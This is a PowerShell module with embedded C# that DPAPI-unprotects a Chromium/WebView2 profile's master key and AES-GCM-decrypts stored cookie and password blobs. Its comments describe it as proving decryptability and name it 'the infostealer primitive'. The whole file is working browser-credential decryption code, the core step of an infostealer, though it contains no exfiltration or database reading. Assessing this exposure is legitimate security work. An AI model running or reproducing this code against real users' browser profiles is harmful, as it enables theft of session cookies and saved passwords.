# Windows credential-store decryption primitives: user-DPAPI unprotect (crypt32) and
# AES-256-GCM (CNG/bcrypt -- the managed AesGcm class is .NET Core-only, so PS 5.1 needs
# the P/Invoke path). Used to PROVE a Chromium/WebView2 profile is decryptable by code
# running as the current user (the infostealer primitive): the os_crypt master key is
# DPAPI-unprotected, then each v10/v11 cookie/password blob is AES-GCM-decrypted with it.
# String-taking bcrypt imports MUST be CharSet.Unicode (the ALG ids are LPCWSTR).

$script:TcpkWinCryptoSrc = @'
using System;
using System.Runtime.InteropServices;
namespace Tcpk {
 public static class WinCrypto {
  [StructLayout(LayoutKind.Sequential)] struct DATA_BLOB { public int cbData; public IntPtr pbData; }
  [DllImport("crypt32.dll", SetLastError=true)] static extern bool CryptUnprotectData(ref DATA_BLOB i, IntPtr d, IntPtr e, IntPtr r, IntPtr p, int f, ref DATA_BLOB o);
  [DllImport("kernel32.dll")] static extern IntPtr LocalFree(IntPtr h);

  // CryptUnprotectData under the CURRENT USER (no entropy). Returns null if the blob was
  // not protected for this user / machine.
  public static byte[] DpapiUnprotect(byte[] data) {
   if (data == null || data.Length == 0) return null;
   var inB = new DATA_BLOB(); var outB = new DATA_BLOB();
   GCHandle h = GCHandle.Alloc(data, GCHandleType.Pinned);
   try {
    inB.cbData = data.Length; inB.pbData = h.AddrOfPinnedObject();
    if (!CryptUnprotectData(ref inB, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref outB)) return null;
    byte[] o = new byte[outB.cbData];
    Marshal.Copy(outB.pbData, o, 0, outB.cbData);
    return o;
   } catch { return null; }
   finally { h.Free(); if (outB.pbData != IntPtr.Zero) LocalFree(outB.pbData); }
  }

  [DllImport("bcrypt.dll", CharSet=CharSet.Unicode)] static extern int BCryptOpenAlgorithmProvider(out IntPtr h, string id, string impl, int f);
  [DllImport("bcrypt.dll")] static extern int BCryptCloseAlgorithmProvider(IntPtr h, int f);
  [DllImport("bcrypt.dll", CharSet=CharSet.Unicode)] static extern int BCryptSetProperty(IntPtr h, string p, byte[] i, int cb, int f);
  [DllImport("bcrypt.dll")] static extern int BCryptGenerateSymmetricKey(IntPtr a, out IntPtr k, IntPtr ko, int cbko, byte[] s, int cbs, int f);
  [DllImport("bcrypt.dll")] static extern int BCryptDestroyKey(IntPtr k);
  [DllImport("bcrypt.dll")] static extern int BCryptDecrypt(IntPtr k, byte[] i, int cbi, ref AI pad, byte[] iv, int cbiv, byte[] o, int cbo, out int res, int f);

  [StructLayout(LayoutKind.Sequential)] struct AI {
   public int cbSize; public int dwInfoVersion; public IntPtr pbNonce; public int cbNonce;
   public IntPtr pbAuthData; public int cbAuthData; public IntPtr pbTag; public int cbTag;
   public IntPtr pbMacContext; public int cbMacContext; public int cbAAD; public long cbData; public int dwFlags;
  }

  // AES-256-GCM one-shot decrypt (the Chromium v10/v11 scheme). Returns null on any failure
  // incl. tag mismatch, so a wrong key never yields garbage.
  public static byte[] AesGcmDecrypt(byte[] key, byte[] nonce, byte[] cipher, byte[] tag) {
   if (key == null || nonce == null || cipher == null || tag == null) return null;
   IntPtr a; if (BCryptOpenAlgorithmProvider(out a, "AES", null, 0) != 0) return null;
   IntPtr k = IntPtr.Zero;
   GCHandle gn = default(GCHandle), gt = default(GCHandle);
   try {
    byte[] m = System.Text.Encoding.Unicode.GetBytes("ChainingModeGCM\0");
    if (BCryptSetProperty(a, "ChainingMode", m, m.Length, 0) != 0) return null;
    if (BCryptGenerateSymmetricKey(a, out k, IntPtr.Zero, 0, key, key.Length, 0) != 0) return null;
    gn = GCHandle.Alloc(nonce, GCHandleType.Pinned);
    gt = GCHandle.Alloc(tag, GCHandleType.Pinned);
    var ai = new AI(); ai.cbSize = Marshal.SizeOf(typeof(AI)); ai.dwInfoVersion = 1;
    ai.pbNonce = gn.AddrOfPinnedObject(); ai.cbNonce = nonce.Length;
    ai.pbTag = gt.AddrOfPinnedObject(); ai.cbTag = tag.Length;
    byte[] o = new byte[cipher.Length]; int res;
    if (BCryptDecrypt(k, cipher, cipher.Length, ref ai, null, 0, o, o.Length, out res, 0) != 0) return null;
    if (res != o.Length) { byte[] t = new byte[res]; Array.Copy(o, t, res); return t; }
    return o;
   } catch { return null; }
   finally {
    if (gn.IsAllocated) gn.Free(); if (gt.IsAllocated) gt.Free();
    if (k != IntPtr.Zero) BCryptDestroyKey(k);
    BCryptCloseAlgorithmProvider(a, 0);
   }
  }
 }
}
'@

if (-not ('Tcpk.WinCrypto' -as [type])) {
    try { Add-Type -TypeDefinition $script:TcpkWinCryptoSrc -ErrorAction Stop } catch { }
}

# Recover a Chromium/WebView2 profile's AES-256 master key from its "Local State" file:
# os_crypt.encrypted_key is base64( "DPAPI" + CryptProtectData(key) ), so strip the 5-byte
# "DPAPI" prefix and DPAPI-unprotect the rest. Returns the 32-byte key, or $null if the file
# is missing / App-Bound-Encrypted / not decryptable as this user.
function Get-TcpkChromiumMasterKey {
    [CmdletBinding()] param([Parameter(Mandatory)][string]$LocalStatePath)
    if (-not ('Tcpk.WinCrypto' -as [type])) { return $null }
    if (-not (Test-Path -LiteralPath $LocalStatePath)) { return $null }
    $b64 = $null
    try {
        $ls = Get-Content -LiteralPath $LocalStatePath -Raw | ConvertFrom-Json
        $b64 = "$($ls.os_crypt.encrypted_key)"
    } catch { return $null }
    if (-not $b64) { return $null }
    $raw = $null; try { $raw = [Convert]::FromBase64String($b64) } catch { return $null }
    if (-not $raw -or $raw.Length -le 5) { return $null }
    # must start with the ASCII prefix "DPAPI" (App-Bound keys start with "APPB")
    $prefix = [Text.Encoding]::ASCII.GetString($raw, 0, 5)
    if ($prefix -ne 'DPAPI') { return $null }
    $blob = New-Object byte[] ($raw.Length - 5)
    [Array]::Copy($raw, 5, $blob, 0, $blob.Length)
    return [Tcpk.WinCrypto]::DpapiUnprotect($blob)
}

# Decrypt a Chromium v10/v11 encrypted_value blob (from the Cookies / Login Data DB) with the
# recovered master key: [ "v10"|"v11" (3) ][ nonce (12) ][ ciphertext ][ GCM tag (16) ].
# Returns the plaintext string, or $null if the shape is wrong / the key does not match.
function Unprotect-TcpkChromiumBlob {
    [CmdletBinding()] param([Parameter(Mandatory)][byte[]]$Key, [Parameter(Mandatory)][byte[]]$Blob)
    if (-not ('Tcpk.WinCrypto' -as [type])) { return $null }
    if ($Key.Length -ne 32 -or $Blob.Length -lt (3 + 12 + 16)) { return $null }
    $tag3 = [Text.Encoding]::ASCII.GetString($Blob, 0, 3)
    if ($tag3 -ne 'v10' -and $tag3 -ne 'v11') { return $null }
    $nonce = New-Object byte[] 12;              [Array]::Copy($Blob, 3, $nonce, 0, 12)
    $ctLen = $Blob.Length - 3 - 12 - 16
    if ($ctLen -le 0) { return $null }
    $cipher = New-Object byte[] $ctLen;         [Array]::Copy($Blob, 15, $cipher, 0, $ctLen)
    $tag = New-Object byte[] 16;                [Array]::Copy($Blob, $Blob.Length - 16, $tag, 0, 16)
    $pt = [Tcpk.WinCrypto]::AesGcmDecrypt($Key, $nonce, $cipher, $tag)
    if (-not $pt) { return $null }
    return [Text.Encoding]::UTF8.GetString($pt)
}
